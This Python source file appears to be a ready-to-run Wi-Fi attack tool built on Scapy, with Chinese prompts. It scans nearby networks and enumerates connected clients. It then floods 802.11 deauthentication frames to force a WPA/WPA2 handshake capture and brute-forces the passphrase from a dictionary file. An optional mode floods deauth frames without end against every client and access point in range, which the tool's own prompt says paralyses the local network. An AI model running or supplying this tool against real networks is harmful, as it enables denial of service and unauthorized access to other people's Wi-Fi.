from scapy.all import *
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11, RadioTap, Dot11Deauth
from ak import sout
from crypto import *
import multiprocessing
from itertools import repeat


def scan_wifi():
    print("正在扫描附近的设备...")
    networks = []

    def packet_callback(packet):
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11Elt].info.decode(errors="ignore")
            mac = packet[Dot11].addr2
            if ssid not in [network["ssid"] for network in networks]:
                networks.append({"ssid": ssid, "mac": mac})

    sniff(prn=packet_callback, iface=interface, timeout=10)
    return networks


def capture_clients(target_ssid, target_mac, device_macs):
    if target_ssid is None:
        return
    print(f"开始捕获连接到({target_ssid}) 下的设备")
    print("crtl + c 下一步或等待扫描结束")

    def packet_callback(packet):
        if packet.haslayer(Dot11):
            src = packet[Dot11].addr2
            if src == target_mac:
                client_mac = packet.addr1
                if client_mac and client_mac not in device_macs and client_mac != "ff:ff:ff:ff:ff:ff":
                    print(f"发现客户端设备 MAC: {client_mac}")
                    device_macs.append(client_mac)

    sniff(prn=packet_callback, iface=interface, timeout=30)

    return device_macs


def send_deauth(target_mac, ap_mac):
    print(f"发送断开帧至 {target_mac} (客户端) 和 {ap_mac} (AP)...")

    packet = RadioTap() / Dot11(addr1=target_mac,
                                addr2=ap_mac,
                                addr3=ap_mac) / Dot11Deauth(reason=7)
    sendp(packet, inter=0.01,
          count=68, iface=interface,
          verbose=1)


def capture_handshake(target_mac, ap_mac):
    print("开始捕获4次握手包...")

    def packet_callback(packet):
        if packet.haslayer(Dot11):
            if packet.haslayer(EAPOL):
                if (packet.addr1 == target_mac and packet.addr2 == ap_mac) or (packet.addr1 == ap_mac and packet.addr2 == target_mac):
                    print("捕获到握手包之一")
                    handshake_packets.append(packet)
                    print(f"保存 {len(handshake_packets)} 个握手包至 handshake.cap")
                    if len(handshake_packets) == 4:
                        print("捕获到 4 次握手包，停止捕获。")
                        stop_event.set()

    sniff(prn=packet_callback, iface=interface, timeout=100)


def ak(target_mac, ap_mac):
    sout()
    print(target_mac, ap_mac)
    packet = RadioTap() / Dot11(addr1=target_mac,
                                addr2=ap_mac,
                                addr3=ap_mac) / Dot11Deauth(reason=7)
    sendp(packet, inter=0.01,
          count=100, iface=interface,
          verbose=1)


def process_device_network_pairs(device_macs, networks):
    with ThreadPoolExecutor() as executor:
        futures = []
        for device_mac in device_macs:
            for network in networks:
                futures.append(executor.submit(ak, device_mac, network['mac']))
        for future in futures:
            future.result()
    time.sleep(1)


def get_networks():
    networks = scan_wifi()
    print("可用的wifi网络：")
    for i, network in enumerate(networks):
        print(f"{i + 1}. SSID: {network['ssid']}  MAC: {network['mac']}")
    return networks


def try_ak(networks):
    device_macs = []
    for network in networks:
        capture_clients(network['ssid'], network['mac'], device_macs)
    while True:
        process_device_network_pairs(device_macs, networks)
    exit(sout())


def get_clientMac(ssid_index, networks):
    device_macs = []
    target_ssid = networks[ssid_index]["ssid"]
    target_apmac = networks[ssid_index]["mac"]
    device_macs = capture_clients(target_ssid, target_apmac, device_macs)
    macs_num = len(device_macs)
    if macs_num == 0:
        exit("该wifi下没有捕获到设备")
    for i, mac in enumerate(device_macs):
        print(f"{i + 1}. 客户端 MAC: {mac}")
    return device_macs, target_apmac


def attack(client_index, device_macs, target_apmac):
    target_clientmac = device_macs[client_index]
    print(target_clientmac)
    capture_thread = threading.Thread(target=capture_handshake, args=(target_clientmac, target_apmac))
    capture_thread.daemon = True
    capture_thread.start()
    try:
        while not stop_event.is_set():
            send_deauth(target_clientmac, target_apmac)
            time.sleep(1)
    except KeyboardInterrupt:
        print("攻击被中断！")

    if len(handshake_packets) > 0:
        print(f"保存 {len(handshake_packets)} 个握手包至 handshake.cap")
        wrpcap("./handshake.cap", handshake_packets)
        print("三秒后开始爆破密码")
        # capture_thread.join()
        for i in range(3, 0, -1):
            print(f"{i}...")
            time.sleep(2)

    else:
        exit("捕获出错")


def try_calc(pcap_file, ssid, passphrase, found_flag, found_password):
    if found_flag.value:
        return None
    flag, password = calc(pcap_file, ssid, passphrase)
    if flag:
        found_flag.value = True
        found_password.value = password
        return True
    sys.stdout.write(f'\rNO this:  {passphrase} ')
    sys.stdout.flush()
    return None


def bp(pcap_file, ssid, dictionary_file):
    manager = multiprocessing.Manager()
    found_flag = manager.Value('b', False)
    found_password = manager.Value('s', '')
    batch_size = 8

    with open(dictionary_file, 'r') as f:
        while True:
            passwords = [f.readline().strip() for _ in range(batch_size)]
            if not passwords[0]:
                # print(22222)
                if not found_flag.value:
                    print("未找到密码")
                break
            pool = multiprocessing.Pool(processes=multiprocessing.cpu_count())
            results = pool.starmap(try_calc, zip(repeat(pcap_file), repeat(ssid), passwords, repeat(found_flag), repeat(found_password)))
            # print(results)
            if found_flag.value:
                print(f"\n找到密码：{found_password.value}")
                pool.terminate()
                pool.close()
                exit("Win!!!")

            pool.close()
            pool.join()
    pool.terminate()
    pool.close()
    pool.join()


def main():
    networks = get_networks()
    choose = input("是否选择众生平等操作yes or no(让当前环境网络瘫痪):")
    if choose == "yes":
        try_ak(networks)

    ssid_index = int(input("选择目标wifi网络的编号: ")) - 1
    device_macs, target_apmac = get_clientMac(ssid_index, networks)

    client_index = int(input("选择目标设备的编号: ")) - 1
    attack(client_index, device_macs, target_apmac)

    bp("./handshake.cap", networks[ssid_index]["ssid"], dictionary_file)


if __name__ == "__main__":
    stop_event = threading.Event()
    handshake_packets = []
    Author =r""" 
Author:
 _   _   _      
| \ | | | |__     ___ 
|  \| | | '_ \   / __|
| |\  | | |_) | | (__ 
|_| \_| |_.__/   \___|
                   """
    print(Author)
    print("\n基于WPA/WPA2握手原理的Wi-Fi密码爆破\n")
    parser = argparse.ArgumentParser(description='Wi-Fi Password Cracking Based on WPA/WPA2 Handshake Principles', formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-i', '--interface', type=str, default='wlan0mon', help='Network adapter (default: wlan0mon)', metavar='')
    parser.add_argument('-f', '--file', type=str, help='Dictionary file path', metavar='')

    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    interface = args.interface
    dictionary_file = args.file
    if dictionary_file is None:
        parser.print_help()
        exit("\nPlease specify the dictionary path\n")
    main()